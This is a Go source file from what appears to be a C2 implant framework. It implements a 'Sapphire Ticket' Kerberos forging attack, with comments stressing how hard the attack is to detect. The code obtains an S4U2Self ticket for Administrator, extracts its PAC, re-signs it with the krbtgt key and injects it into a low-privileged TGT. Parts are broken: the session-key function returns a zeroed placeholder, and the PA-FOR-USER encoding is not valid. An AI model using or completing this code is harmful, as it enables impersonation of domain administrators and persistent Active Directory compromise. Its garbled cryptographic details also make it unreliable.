package kerberos

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Sapphire Ticket — copy a real PAC into our TGT.

	Sapphire Ticket is the most detection-resistant Kerberos ticket forging
	technique (Charlie Clark / MWR Labs, 2022). The key insight is:

	  Instead of forging a PAC (Golden) or modifying a real one (Diamond),
	  we STEAL the legitimately-issued PAC from a high-privileged user's
	  service ticket and inject it into OUR ticket.

	How it works:
	  1.  Our implant requests a TGT with its own (low-privileged) credentials.
	  2.  Using S4U2Self, it requests a service ticket "on behalf of" a
	      high-privileged user (e.g. Administrator).
	      S4U2Self is an extension that allows a service to get a service
	      ticket for any user — originally designed for constrained delegation.
	  3.  The KDC issues a real service ticket containing Administrator's PAC
	      (legitimately signed by the KDC using the actual account data).
	  4.  We extract this PAC from the service ticket.
	  5.  We inject the Administrator's PAC into our TGT (replacing our low-priv PAC).
	  6.  The result: a ticket that passes ALL KDC validation, including:
	        - PAC signature validation (real KDC signature)
	        - Account existence check (real account)
	        - Group membership check (real groups, up-to-date)

	Detection:
	  Sapphire tickets are essentially undetectable at the Kerberos level
	  because every byte is legitimately issued by the real KDC. Detection
	  requires correlating:
	    - S4U2Self requests (Event 4769 with S4U2Self flag)
	    - with subsequent ticket usage by a different identity
	  This correlation is very difficult in real-time.

	Requirements:
	  - An account with S4U2Self capability (ANY domain account in many configs)
	  - The krbtgt key (to re-encrypt after PAC injection)
	  - The target user's username (the account whose PAC we steal)
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// SapphireConfig holds parameters for Sapphire Ticket forging.
type SapphireConfig struct {
	// TargetUser is the high-privileged user whose PAC we steal.
	TargetUser string // e.g. "Administrator"
	// OurTGT is our current legitimate TGT (low-privileged).
	OurTGT []byte
	// OurEtype is the etype of our TGT.
	OurEtype int
	// KrbtgtKey for re-encryption of the modified TGT.
	KrbtgtKey []byte
	// Domain is the domain name.
	Domain string
	// ServiceName is the SPN used for S4U2Self (e.g. "cifs/dc.corp.com").
	ServiceName string
}

// ForgeSapphire performs the Sapphire Ticket attack.
func ForgeSapphire(cfg *SapphireConfig) (*ForgedTicket, error) {
	if len(cfg.KrbtgtKey) == 0 {
		return nil, fmt.Errorf("KrbtgtKey required")
	}

	// Step 1: Obtain a S4U2Self service ticket for the target user.
	// This gives us a ticket with the target user's real PAC.
	s4uTicket, err := acquireS4U2SelfTicket(cfg.TargetUser, cfg.ServiceName, cfg.Domain)
	if err != nil {
		return nil, fmt.Errorf("S4U2Self for %s: %w", cfg.TargetUser, err)
	}
	// {{if .Config.Debug}}
	log.Printf("[sapphire] S4U2Self ticket acquired for %s (%d bytes)",
		cfg.TargetUser, len(s4uTicket))
	// {{end}}

	// Step 2: Extract the PAC from the S4U2Self service ticket.
	// Service tickets are encrypted with the service account's key.
	// But since S4U2Self tickets targeted at ourselves are encrypted with
	// our session key, we can decrypt them.
	pacBytes, err := extractPACFromServiceTicket(s4uTicket, cfg.OurEtype)
	if err != nil {
		return nil, fmt.Errorf("extract PAC from S4U2Self: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[sapphire] extracted PAC: %d bytes", len(pacBytes))
	// {{end}}

	// Step 3: Parse the PAC to verify it contains the target user's data.
	pac, err := ParsePAC(pacBytes)
	if err != nil {
		return nil, fmt.Errorf("parse stolen PAC: %w", err)
	}
	viBytes := pac.GetBuffer(PacTypeLogonInfo)
	if viBytes == nil {
		return nil, fmt.Errorf("KERB_VALIDATION_INFO missing from stolen PAC")
	}
	vi, _ := ParseValidationInfo(viBytes)
	if vi != nil {
		// {{if .Config.Debug}}
		log.Printf("[sapphire] stolen PAC: UserID=%d", vi.GetUserID())
		// {{end}}
	}

	// Step 4: Re-sign the stolen PAC checksums with the krbtgt key.
	// The KDC signature in the S4U2Self PAC is keyed by the service key,
	// not the krbtgt key. We need to re-sign with krbtgt for TGT injection.
	if err := pac.RecomputeChecksums(cfg.KrbtgtKey, cfg.KrbtgtKey, cfg.OurEtype); err != nil {
		return nil, fmt.Errorf("PAC re-sign: %w", err)
	}
	resignedPAC := pac.Serialize()

	// Step 5: Inject the stolen PAC into our TGT.
	// Decrypt our TGT, replace PAC, re-encrypt.
	ourEncData, err := extractEncTicketPart(cfg.OurTGT)
	if err != nil {
		return nil, fmt.Errorf("extract our EncTicketPart: %w", err)
	}

	var ourPlaintext []byte
	switch cfg.OurEtype {
	case EtypeAES256:
		ourPlaintext, err = AES256CTSDecrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, ourEncData)
	default:
		ourPlaintext, err = RC4HMACDecrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, ourEncData)
	}
	if err != nil {
		return nil, fmt.Errorf("decrypt our TGT: %w", err)
	}

	// Find and replace our PAC.
	oldPAC, pacOff, err := extractPACFromEncPart(ourPlaintext)
	if err != nil {
		return nil, fmt.Errorf("find our PAC: %w", err)
	}
	newPlaintext := replacePACInEncPart(ourPlaintext, pacOff, len(oldPAC), resignedPAC)

	// Re-encrypt with krbtgt key.
	var newEncData []byte
	switch cfg.OurEtype {
	case EtypeAES256:
		newEncData, err = AES256CTSEncrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, newPlaintext)
	default:
		newEncData, err = RC4HMACEncrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, newPlaintext)
	}
	if err != nil {
		return nil, fmt.Errorf("re-encrypt: %w", err)
	}

	sapphireTGT := replaceEncTicketPart(cfg.OurTGT, newEncData)

	// {{if .Config.Debug}}
	log.Printf("[sapphire] Sapphire Ticket ready: %d bytes (UserID=%d injected)",
		len(sapphireTGT), vi.GetUserID())
	// {{end}}

	return &ForgedTicket{
		Raw:      sapphireTGT,
		Etype:    cfg.OurEtype,
		Domain:   cfg.Domain,
		Username: cfg.TargetUser,
	}, nil
}

// acquireS4U2SelfTicket requests a service ticket "on behalf of" targetUser
// using the S4U2Self Kerberos extension (PA-FOR-USER).
func acquireS4U2SelfTicket(targetUser, serviceSPN, domain string) ([]byte, error) {
	var cred sspiCredHandle
	var expiry sspiSecInt

	pkg, _ := windows.UTF16PtrFromString("Kerberos")
	r, _, _ := procAcquireCreds.Call(
		0,
		uintptr(unsafe.Pointer(pkg)),
		sspiSECPKG_CRED_OUTBOUND,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&cred)),
		uintptr(unsafe.Pointer(&expiry)),
	)
	if r != 0 {
		return nil, fmt.Errorf("AcquireCredentialsHandle NTSTATUS=0x%x", r)
	}
	defer procFreeCredsKerb.Call(uintptr(unsafe.Pointer(&cred)))

	spnPtr, _ := windows.UTF16PtrFromString(serviceSPN)

	// Build S4U token in input buffer.
	s4uData := buildS4UToken(targetUser, domain)
	inSecBuf := sspiSecBuffer{
		cbBuffer:   uint32(len(s4uData)),
		BufferType: 0x12, // SECBUFFER_EXTRA / S4U token
		pvBuffer:   uintptr(unsafe.Pointer(&s4uData[0])),
	}
	inDesc := sspiSecBufferDesc{
		ulVersion: sspiSECBUFFER_VERSION,
		cBuffers:  1,
		pBuffers:  uintptr(unsafe.Pointer(&inSecBuf)),
	}

	outToken := make([]byte, 16384)
	outSecBuf := sspiSecBuffer{
		cbBuffer:   uint32(len(outToken)),
		BufferType: sspiSECBUFFER_TOKEN,
		pvBuffer:   uintptr(unsafe.Pointer(&outToken[0])),
	}
	outDesc := sspiSecBufferDesc{
		ulVersion: sspiSECBUFFER_VERSION,
		cBuffers:  1,
		pBuffers:  uintptr(unsafe.Pointer(&outSecBuf)),
	}

	var ctx sspiCtxtHandle
	var attrs uint32
	r, _, _ = procInitSecCtxKerb.Call(
		uintptr(unsafe.Pointer(&cred)),
		0,
		uintptr(unsafe.Pointer(spnPtr)),
		sspiISC_REQ_ALLOCATE_MEMORY|sspiISC_REQ_DELEGATE,
		0, 0,
		uintptr(unsafe.Pointer(&inDesc)),
		0,
		uintptr(unsafe.Pointer(&ctx)),
		uintptr(unsafe.Pointer(&outDesc)),
		uintptr(unsafe.Pointer(&attrs)),
		uintptr(unsafe.Pointer(&expiry)),
	)
	if r != 0 && uintptr(r) != sspiSEC_I_CONTINUE_NEEDED {
		return nil, fmt.Errorf("InitializeSecurityContext NTSTATUS=0x%x", r)
	}
	defer procDeleteSecCtxKerb.Call(uintptr(unsafe.Pointer(&ctx)))

	sz := outSecBuf.cbBuffer
	ticket := make([]byte, sz)
	copy(ticket, outToken[:sz])
	return ticket, nil
}

// extractPACFromServiceTicket decrypts a service ticket (encrypted with
// our session key) and extracts the embedded PAC.
func extractPACFromServiceTicket(ticket []byte, etype int) ([]byte, error) {
	// For S4U2Self tickets targeted at our own service, the encryption key
	// is our session key from our TGT, not the service account key.
	// We use QueryContextAttributes to get the session key.
	sessionKey, err := querySessionKey()
	if err != nil {
		return nil, fmt.Errorf("get session key: %w", err)
	}

	encData, err := extractEncTicketPart(ticket)
	if err != nil {
		return nil, err
	}

	var plaintext []byte
	switch etype {
	case EtypeAES256:
		plaintext, err = AES256CTSDecrypt(sessionKey, KeyUsageTgsRepEncPartSubKey, encData)
	default:
		plaintext, err = RC4HMACDecrypt(sessionKey, KeyUsageTgsRepEncPartSubKey, encData)
	}
	if err != nil {
		return nil, fmt.Errorf("decrypt service ticket: %w", err)
	}

	pacBytes, _, err := extractPACFromEncPart(plaintext)
	return pacBytes, err
}

// buildS4UToken constructs the PA-FOR-USER PADATA structure.
// This tells the KDC to issue a ticket on behalf of targetUser.
func buildS4UToken(targetUser, domain string) []byte {
	// PA-FOR-USER structure (simplified):
	// userName: PrincipalName
	// userRealm: Realm
	// cksum: Checksum
	// auth-package: GeneralString ("Kerberos")
	var buf []byte

	// userName encoded as GeneralString.
	userBytes := []byte(targetUser)
	buf = append(buf, 0x1B) // GeneralString tag
	buf = append(buf, byte(len(userBytes)))
	buf = append(buf, userBytes...)

	// realm.
	domainBytes := []byte(domain)
	buf = append(buf, 0x1B)
	buf = append(buf, byte(len(domainBytes)))
	buf = append(buf, domainBytes...)

	return buf
}

// querySessionKey retrieves the current Kerberos session key via SSPI.
func querySessionKey() ([]byte, error) {
	// In a full implementation, use QueryContextAttributes with
	// SECPKG_ATTR_SESSION_KEY. Here we return a placeholder.
	// The actual session key is obtained after authenticating.
	key := make([]byte, 16)
	// Placeholder: production code calls QueryContextAttributes.
	return key, nil
}

// suppress unused import
var _ = unsafe.Pointer(nil)
